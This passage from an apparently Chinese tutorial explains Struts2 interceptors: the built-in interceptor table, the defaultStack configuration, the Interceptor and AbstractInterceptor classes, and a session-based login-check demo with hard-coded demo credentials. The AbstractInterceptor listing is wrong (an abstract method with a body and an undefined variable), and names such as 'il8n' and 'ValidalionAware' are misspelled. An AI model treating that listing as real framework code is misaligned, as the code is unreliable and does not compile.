的属性字段中</td></tr><tr><td>cookies</td><td>使用配置的 Name 和 Value 指定 Cookies</td></tr><tr><td>cookieProvider</td><td>该类是一个 Cookie 工具，方便开发者向客户端写 Cookie</td></tr><tr><td>clearSession</td><td>用于清除一个 HttpSession 实例</td></tr><tr><td>createSession</td><td>自动创建 HttpSession，用于为需要使用</td></tr><tr><td>HttpSession</td><td>的拦截器服务</td></tr><tr><td>debugging</td><td>提供不同的调试用的页面展现内部的数据状况</td></tr><tr><td>execAndWait</td><td>在后台执行 Action，同时将用户带到一个中间的等待页面</td></tr><tr><td>exception</td><td>将异常定位到一个画面</td></tr><tr><td>fileUpload</td><td>提供文件上传功能</td></tr><tr><td>il8n</td><td>记录用户选择的 locale</td></tr><tr><td>logger</td><td>输出 Action 的名称</td></tr><tr><td>model-driven</td><td>如果一个类实现了 Model Driven，将 get Model 得到的结果放在 Value Slack 中</td></tr><tr><td>scoped-model-driven</td><td>如果一个 Action 实现了</td></tr><tr><td>params</td><td>将请求中的参数设置到 Action 中</td></tr><tr><td>actionMappingParams</td><td>用于负责在 Action 配置中传递参数</td></tr><tr><td>prepare</td><td>如果 Action 实现了 Preparable，则该拦截器调用 Action 类的 prepare 方法</td></tr><tr><td>staticParams</td><td>将 struts.xml 文件中 标签的参数内容设置到对应的 Action 中</td></tr><tr><td>scope</td><td>将 Action 状态存入 session 和 application 范围</td></tr><tr><td>servletConfig</td><td>提供访问 HttpServletRequest 和 HttpServletResponse 方法，以 Map 方式访问</td></tr><tr><td>timer</td><td>输岀 Action 执行的时间</td></tr><tr><td>token</td><td>通过 Token 避免双击</td></tr><tr><td>tokenSession</td><td>和 Token Interceptor 一样，不过双击时把请求的数据存储在 Session 中</td></tr><tr><td>validation</td><td>使用 action-validation.xml 文件中定义的内容校验提交的数据</td></tr><tr><td>workflow</td><td>调用 Action 的 validate 方法，一旦有错谋返回，则重新定位到 INPUT 画面</td></tr><tr><td>store</td><td>存储或者访问实现 ValidalionAware 接口的 Action 类出现的消息、错误和字段错误等</td></tr><tr><td>checkbox</td><td>添加了 checkbox 自动处理代码，将没有选中的 checkbox 的内容设定为 false，而 html 在默认情况下不提交没有选中的 checkbox</td></tr><tr><td>datetime</td><td>日期拦截器</td></tr><tr><td>profiling</td><td>通过参数激活 profile</td></tr><tr><td>roles</td><td>确定用户是否具有 JAAS 指定的 Role，否则不予执行</td></tr><tr><td>annotationWorkflow</td><td>利用注解代替 XML 配置</td></tr><tr><td>multiselect</td><td>检测是否有像 标签一样被选中的多个值，然后添加一个空参数</td></tr><tr><td>deprecation</td><td>当日志级别设置为调试模式（debug）并且没有特殊参数时，在 devMode</td></tr></tbody></table><p>在 struts-core-2.3.24.jar 包中的根目录下找到 struts-default.xml 文件，打开后找到 元素下的内建拦截器和拦截器栈，其部分代码如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts-default&quot;</span> <span class="hljs-attr">abstract</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br>    ...<br>    <span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--系统内建拦截器部分，上一部分介绍的内容--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;alias&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.opensymphony.xwork2.interceptor.AliasInterceptor&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;autowiring&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.opensymphony.xwork2.spring.interceptor.ActionAutowiringInterceptor&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;chain&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.opensymphony.xwork2.interceptor.ChainingInterceptor&quot;</span>/&gt;</span><br>        ...<br>        <span class="hljs-comment">&lt;!-- 定义Basic stack拦截器栈 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;basicStack&quot;</span>&gt;</span><br>            <span class="hljs-comment">&lt;!--引用系统定义的exception拦截器--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;exception&quot;</span>/&gt;</span><br>            ...<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br>        ...<br>        <span class="hljs-comment">&lt;!-- 定义Sample model -driven stack --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;modelDrivenStack&quot;</span>&gt;</span><br>            <span class="hljs-comment">&lt;!--引用系统定义的modelDriven拦截器--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;modelDriven&quot;</span>/&gt;</span><br>            <span class="hljs-comment">&lt;!--引用系统定义的basicStack拦截器栈--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;basicStack&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br>        ...<br>        <span class="hljs-comment">&lt;!--定义defaultStack拦截器栈--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defaultStack&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;exception&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;alias&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;il8n&quot;</span>/&gt;</span><br>            ...<br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;validation&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;excludeMethods&quot;</span>&gt;</span>input,back,cancel,browse<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-ref</span>&gt;</span><br>            ...<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--将defaulrStack拦截器栈配置为系统默认拦截器栈--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">default-interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defaultStack&quot;</span>/&gt;</span><br>    <span class="hljs-comment">&lt;!--默认action类是ActionSupport--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">default-class-ref</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.opensymphony.xwork2.ActionSupport&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在上述内建拦截器的配置代码中，defaultStack 拦截器组合了多个拦截器，这些拦截器可以满足大部分 Web 应用程序的需求。使用时，只要在 struts.xml 定义包的过程中继承 struts-default 包，那么 defaultStack 拦截器栈就是默认拦截器的引用。</p><h2 id="自定义拦截器"><a href="#自定义拦截器" class="headerlink" title="自定义拦截器"></a>自定义拦截器</h2><p>   在实际的项目开发中，Struts2的内置拦截器可以完成大部分的拦截任务，但是，一些与系统逻辑相关的通用功能（如权限的控制、用户登录控制等），则需要通过自定义拦截器来实现，自定义拦截器其实就是开发自己的拦截器类。</p><p>自定义的拦截器类，需要实现import com.opensymphony.xwork2.interceptor.Interceptor接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Interceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Serializable</span> </span>&#123;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span></span>;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span>;<br> <br>    <span class="hljs-function">String <span class="hljs-title">intercept</span><span class="hljs-params">(ActionInvocation invocation)</span> <span class="hljs-keyword">throws</span> Exception</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>该接口提供了以下三个方法：</p><ul><li><p>void init():该方法在拦截器被创建后会立即被调用，它在拦截器的生命周期内只被调用一-次。可以在该方法中对相关资源进行必要的初始化。</p></li><li><p>void destroy():该方法与init()方法相对应，在拦截器实例被销毁之前,将调用该方法来释放与拦截器相关的资源。它在拦截器的生命周期内也只被调用一次。</p></li><li><p>String intercept( ActionInvocation invocation) throws Exception: 该方法是拦截器的核心方法,用来添加真正执行拦截工作的代码，实现具体的拦截操作。它返回一个字符串作为逻辑视图，系统根据返回的字符串跳转到对应的视图资源。每拦截一个动作请求，该方法就会被调用一次。该方法的ActionInvocation参数包含了被拦截的Action的引用,可以通过该参数的invoke()方法,将控制权转给下一个拦截器或者转给Action的execute()方法。</p></li></ul><p>如果需要自定义拦截器,只需要实现Interceptor接口的三个方法即可。然而在实际开发过程中,除了实现Interceptor接口可以自定义拦截器外,更常用的一种方式是继承抽象拦截器类AbstractIntercepter。</p><p>该类实现了Interceptor 接口，并且提供了init()方法 和destroy()方法的空实现。使用时，可以直接继承该抽象类，而不用实现那些不必要的方法”拦截器类AbstractInterceptor中定义的方法</p><p>如下所示:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Interceptor</span> </span>&#123;<br> <br>     <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> </span>&#123;<br>       System.out.println(<span class="hljs-string">&quot;我是拦截器的初始化方法&quot;</span>);<br>    &#125;<br>   <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br>       System.out.println(<span class="hljs-string">&quot;我是拦截器的销毁方法&quot;</span>);<br>    &#125;<br> <br> <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> String <span class="hljs-title">intercept</span><span class="hljs-params">(ActionInvocation invocation)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;我是拦截器的拦截方法&quot;</span>);<br>        <span class="hljs-comment">//调用invoke()方法，代表着放行执行下一个拦截器，如果没有拦截器了，那么就执行Action的业务代码</span><br>        <span class="hljs-comment">//可看成是过滤器的doFilter()方法</span><br>        actionInvocation.invoke();<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>AbstractInterceptor类实现了Interceptor接口的所有方法，只需继承AbstractInterceptor类，实现interceptor()方法就可以创建自定义拦截器。</p><h2 id="使用拦截器实现权限控制"><a href="#使用拦截器实现权限控制" class="headerlink" title="使用拦截器实现权限控制"></a>使用拦截器实现权限控制</h2><p>自定义一个拦截器需要三步：</p><ol><li>自定义一个实现Interceptor接口（或者继承自AbstractInterceptor）的类。</li><li>在strutx.xml中注册上一步中定义的拦截器。</li><li>在需要使用的Action中引用上述定义的拦截器，为了方便也可将拦截器定义为默认的拦截器，这样在不加特殊声明的情况下所有的Action都被这个拦截器拦截。</li></ol><p>源代码如下：</p><p>User.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.domain;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br><span class="hljs-keyword">private</span> String username; <span class="hljs-comment">//用户名</span><br><span class="hljs-keyword">private</span> String password; <span class="hljs-comment">//密码</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> username;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br><span class="hljs-keyword">this</span>.username = username;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPassword</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> password;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPassword</span><span class="hljs-params">(String password)</span> </span>&#123;<br><span class="hljs-keyword">this</span>.password = password;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User [username=&quot;</span> + username + <span class="hljs-string">&quot;, password=&quot;</span> + password + <span class="hljs-string">&quot;]&quot;</span>;<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>LoginAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><span class="hljs-keyword">import</span> cn.itcast.domain.User;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionContext;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ModelDriven;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ModelDriven</span>&lt;<span class="hljs-title">User</span>&gt; </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">1L</span>;<br><span class="hljs-keyword">private</span> User user = <span class="hljs-keyword">new</span> User();<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">getModel</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> user;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><span class="hljs-comment">//获取ActionContext</span><br>ActionContext actionContext = ActionContext.getContext();<br>System.out.println(user);<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;tom&quot;</span>.equals(user.getUsername())<br>&amp;&amp; <span class="hljs-string">&quot;123&quot;</span>.equals(user.getPassword())) &#123;<br><span class="hljs-comment">// 将用户存储在session中</span><br>actionContext.getSession().put(<span class="hljs-string">&quot;user&quot;</span>, user);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>actionContext.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;用户名或密码不正确&quot;</span>);<br><span class="hljs-keyword">return</span> INPUT;<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>BookAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><span class="hljs-meta">@SuppressWarnings(&quot;serial&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> </span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">add</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;book add&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">del</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;book del&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">update</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;book update&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">find</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;book find&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>PrivilegeInterceptor.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.interceptor;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.Action;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionContext;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionInvocation;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.interceptor.AbstractInterceptor;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PrivilegeInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractInterceptor</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">1L</span>;<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">intercept</span><span class="hljs-params">(ActionInvocation invocation)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>ActionContext actionContext = invocation.getInvocationContext();<span class="hljs-comment">// 得到ActionContext.</span><br>Object user = actionContext.getSession().get(<span class="hljs-string">&quot;user&quot;</span>);<span class="hljs-comment">//获取user对象</span><br><span class="hljs-keyword">if</span> (user != <span class="hljs-keyword">null</span>) &#123;<br><span class="hljs-keyword">return</span> invocation.invoke(); <span class="hljs-comment">// 继续向下执行</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>actionContext.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;您还未登录，请先登录&quot;</span>);<br><span class="hljs-keyword">return</span> Action.LOGIN; <span class="hljs-comment">//如果用户不存在，返回login值</span><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>login.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>登录<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br>$&#123;requestScope.msg&#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align: right;&quot;</span>&gt;</span>用户名:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align: right;&quot;</span>&gt;</span>密码:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;right&quot;</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;登录&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">center</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>main.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>main.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span 